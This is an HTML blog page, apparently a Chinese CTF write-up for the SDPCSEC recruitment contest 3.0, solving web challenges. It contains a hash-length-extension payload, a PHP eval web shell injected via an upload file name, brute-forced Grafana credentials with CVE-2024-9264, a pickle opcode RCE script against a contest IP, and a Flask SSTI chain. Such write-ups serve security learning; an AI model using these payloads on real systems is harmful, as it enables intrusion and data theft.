@@ -1,0 +1,787 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="https://gitee.com/bobrocket/img/raw/master/Snipaste_2025-12-30_21-02-15.png">
+  <link rel="icon" href="https://gitee.com/bobrocket/img/raw/master/Snipaste_2025-12-30_21-02-15.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="suny">
+  <meta name="keywords" content="">
+  <meta name="referrer" content="no-referrer">
+  
+    <meta name="description" content="webreal_signin提示有备份，直接扫一下目录，果然发现了index.php.bak 12345678910111213141516171819&lt;?php$SECRET_KEY&#x3D;&#x27;xxxxxxxxxxxx&#x27;; # len($SECRET_KEY) &#x3D; 12function hashEncode($data) &#123;    global $SECRET_KEY">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SDPCSEC纳新赛3.0">
+<meta property="og:url" content="https://www.sunynov.top/2026/03/28/SDPCSEC%E7%BA%B3%E6%96%B0%E8%B5%9B3/index.html">
+<meta property="og:site_name" content="suny">
+<meta property="og:description" content="webreal_signin提示有备份，直接扫一下目录，果然发现了index.php.bak 12345678910111213141516171819&lt;?php$SECRET_KEY&#x3D;&#x27;xxxxxxxxxxxx&#x27;; # len($SECRET_KEY) &#x3D; 12function hashEncode($data) &#123;    global $SECRET_KEY">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260328212742220.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260328212924400.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260328213401437.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260328214027001.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260329094307881.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260329172406361.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260329145940199.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260329150112668.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/flag.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260329150857859.png">
+<meta property="article:published_time" content="2026-03-28T13:20:41.000Z">
+<meta property="article:modified_time" content="2026-03-29T09:24:17.798Z">
+<meta property="article:author" content="suny">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260328212742220.png">
+  
+  
+  
+  <title>SDPCSEC纳新赛3.0 - suny</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.sunynov.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>suny</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SDPCSEC纳新赛3.0"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        suny
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-28 21:20" pubdate>
+          2026年3月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SDPCSEC纳新赛3.0</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年3月29日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="real-signin"><a href="#real-signin" class="headerlink" title="real_signin"></a>real_signin</h2><p>提示有备份，直接扫一下目录，果然发现了index.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$SECRET_KEY</span>=<span class="hljs-string">&#x27;xxxxxxxxxxxx&#x27;</span>; <span class="hljs-comment"># len($SECRET_KEY) = 12</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hashEncode</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$SECRET_KEY</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$SECRET_KEY</span>.<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-variable">$value</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;value&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$md5</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$value</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">hashEncode</span>(<span class="hljs-string">&#x27;sdpc&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">hashEncode</span>(<span class="hljs-variable">$value</span>)===<span class="hljs-variable">$md5</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes, give you flag: &quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="非预期？"><a href="#非预期？" class="headerlink" title="非预期？"></a>非预期？</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">value</span>=sdpc&amp;md5=<span class="hljs-number">193</span>a8f62eed8bd2bb6d07dbfd8579d34<br></code></pre></td></tr></table></figure>
+
+<p>直接就能出来，不知道是不是就是这样的</p>
+<p>猜测应该想考哈希扩展</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260328212742220.png" srcset="/img/loading.gif" lazyload alt="image-20260328212742220"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">value<span class="hljs-operator">=</span>sdpc<span class="hljs-variable">%80</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%80</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span>abc&amp;md<span class="hljs-number">5</span><span class="hljs-operator">=</span>fb<span class="hljs-number">7</span>abb<span class="hljs-number">3</span>b<span class="hljs-number">78411196</span>d<span class="hljs-number">42</span><span class="hljs-keyword">c</span><span class="hljs-number">50</span><span class="hljs-keyword">c</span><span class="hljs-number">684596</span>d<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260328212924400.png" srcset="/img/loading.gif" lazyload alt="image-20260328212924400"></p>
+<h2 id="点墨染翰"><a href="#点墨染翰" class="headerlink" title="点墨染翰"></a>点墨染翰</h2><p>上传头像只允许jpg和png，并且后端做了检查</p>
+<p>查看历史页面的源码有一段比较可疑</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>当前头像:<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar-display&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;uploads/b2e5b371c29c0e14_1774704522.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Current Avatar&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;code-execution&quot;</span>&gt;</span>7.png <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>推测漏洞点在7.png上</p>
+<p>上传文件名为 <code>&lt;?php phpinfo();?&gt;.png</code>成功读取，下面上马</p>
+<p><code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;.png</code></p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260328213401437.png" srcset="/img/loading.gif" lazyload alt="image-20260328213401437"></p>
+<h2 id="real-Grafana"><a href="#real-Grafana" class="headerlink" title="real_Grafana"></a>real_Grafana</h2><p>这个版本的grafana有CVE，但是需要用户名和密码，我们直接爆破一下</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>editor<br><span class="hljs-symbol">password:</span>editor123<br></code></pre></td></tr></table></figure>
+
+<p>下面直接打CVE-2024-9264</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260328214027001.png" srcset="/img/loading.gif" lazyload alt="image-20260328214027001"></p>
+<h2 id="Y0u-r3-n0t-Acc1oFl4g"><a href="#Y0u-r3-n0t-Acc1oFl4g" class="headerlink" title="Y0u_@r3_n0t_Acc1oFl4g"></a>Y0u_@r3_n0t_Acc1oFl4g</h2><p><strong>app.py</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, <br>session, render_template_string, url_for,<br>redirect<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> notAcc1oFl4g<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.<br>Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;config&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span> <br>        <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules<br>            [module], name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;&#x27;%s.</span><br><span class="hljs-string">        %s&#x27; not allowed&quot;</span> % (module, name))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to </span><br><span class="hljs-string">    pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO<br>    (s)).load()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;Hello </span><br><span class="hljs-string">    Hacker&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret</span>():<br>    info = request.args.get(<span class="hljs-string">&#x27;param&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> info <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;&#x27;</span>:<br>        x = base64.b64decode(info)<br>        User = restricted_loads(x)<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;oh you </span><br><span class="hljs-string">    find it&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">True</span>, <br>    port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>config.py</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">notAcc1oFl4g=&#123;<span class="hljs-string">&quot;Acc1oFl4g&quot;</span>:<span class="hljs-string">&quot;no&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-keyword">if</span> notAcc1oFl4g[<span class="hljs-string">&quot;Acc1oFl4g&quot;</span>]==<span class="hljs-string">&quot;yes&quot;</span>:<br>        s=<span class="hljs-string">&#x27;&#x27;</span>.join(cmd)<br>        <span class="hljs-built_in">exec</span>(s)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x2F;secret 路由接受 param 参数</li>
+<li>参数经过 base64 解码后，传入 restricted_loads() 进行 pickle 反序列化</li>
+</ul>
+<p>分析 RestrictedUnpickler 限制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.<br>Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;config&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span> <br>        <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules<br>            [module], name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;&#x27;%s.</span><br><span class="hljs-string">        %s&#x27; not allowed&quot;</span> % (module, name))<br></code></pre></td></tr></table></figure>
+
+<p><strong>限制条件</strong>:</p>
+<ol>
+<li>只能从 config 模块加载类&#x2F;函数</li>
+<li>名称不能包含 __（防止使用 <strong>reduce</strong>、<strong>init</strong> 等魔术方法）</li>
+</ol>
+<p>config.py 中存在一个 backdoor 函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-keyword">if</span> notAcc1oFl4g[<span class="hljs-string">&quot;Acc1oFl4g&quot;</span>]==<span class="hljs-string">&quot;yes&quot;</span>:<br>        s=<span class="hljs-string">&#x27;&#x27;</span>.join(cmd)<br>        <span class="hljs-built_in">exec</span>(s)<br></code></pre></td></tr></table></figure>
+
+<p><strong>关键点</strong>:</p>
+<ul>
+<li>backdoor 函数可以执行任意 Python 代码</li>
+<li>但需要 notAcc1oFl4g[“Acc1oFl4g”]&#x3D;&#x3D;”yes” 才能触发</li>
+<li>notAcc1oFl4g 是一个字典，初始值为 {“Acc1oFl4g”:”no”}</li>
+</ul>
+<p><strong>攻击思路</strong></p>
+<p>利用 pickle 操作码：</p>
+<ol>
+<li>获取 config.notAcc1oFl4g 字典对象</li>
+<li>修改字典值：notAcc1oFl4g[“Acc1oFl4g”] &#x3D; “yes”</li>
+<li>获取 config.backdoor 函数</li>
+<li>调用 backdoor 执行任意代码</li>
+</ol>
+<p>这里有一个叫pker的工具可以帮我们利用操作码，这里好像有python版本兼容问题，要放kali里面跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br>sys.path.insert(<span class="hljs-number">0</span>, <span class="hljs-string">r&#x27;/home/kali/桌面/pker-master/&#x27;</span>)<br><br><span class="hljs-keyword">from</span> pker <span class="hljs-keyword">import</span> cons<br><br>payload=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">a=GLOBAL(&#x27;config&#x27;,&#x27;notAcc1oFl4g&#x27;)</span><br><span class="hljs-string">a[&#x27;Acc1oFl4g&#x27;] = &#x27;yes&#x27;</span><br><span class="hljs-string">func=GLOBAL(&#x27;config&#x27;,&#x27;backdoor&#x27;)</span><br><span class="hljs-string">func(&#x27;raise Exception(open(&quot;/flag&quot;).read())&#x27;)&quot;&quot;&quot;</span><br><br>payload = cons(payload)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
+
+<p>由于这里没有回显，所以我们用异常抛出把flag吐出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">b&#x27;cconfig\nnotAcc1oFl4g\np0\n0g0\nS\&#x27;Acc1oFl4g\&#x27;\nS\&#x27;yes\&#x27;\nscconfig\nbackdoor\np2\n0g2\n(S\&#x27;raise Exception(open(&quot;/flag&quot;).read())\&#x27;\ntR&#x27;</span><br><br>encoded = base64.b64encode(payload).decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Payload: <span class="hljs-subst">&#123;encoded&#125;</span>&quot;</span>)<br><br>url = <span class="hljs-string">&quot;http://175.27.251.122:35425/secret&quot;</span><br>response = requests.get(url, params=&#123;<span class="hljs-string">&quot;param&quot;</span>: encoded&#125;)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Response: <span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260329094307881.png" srcset="/img/loading.gif" lazyload alt="image-20260329094307881"></p>
+<h4 id="referer"><a href="#referer" class="headerlink" title="referer"></a>referer</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13498">pickle反序列化漏洞基础知识与绕过简析-先知社区</a></p>
+<h2 id="超かぐや姫！"><a href="#超かぐや姫！" class="headerlink" title="超かぐや姫！"></a>超かぐや姫！</h2><p>flask框架，邮箱的地方存在ssti，但是邮箱地址不让有小括号、中括号，试了双引号包裹貌似也不行，这样就不能执行命令了</p>
+<p>后台应该是把config和request也删了，没法直接调用</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&#123;&#123;lipsum.__globals__<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.sys</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.flask</span><span class="hljs-selector-class">.current_app</span>.config&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>找到一条能读敏感信息的链子</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260329172406361.png" srcset="/img/loading.gif" lazyload alt="image-20260329172406361"></p>
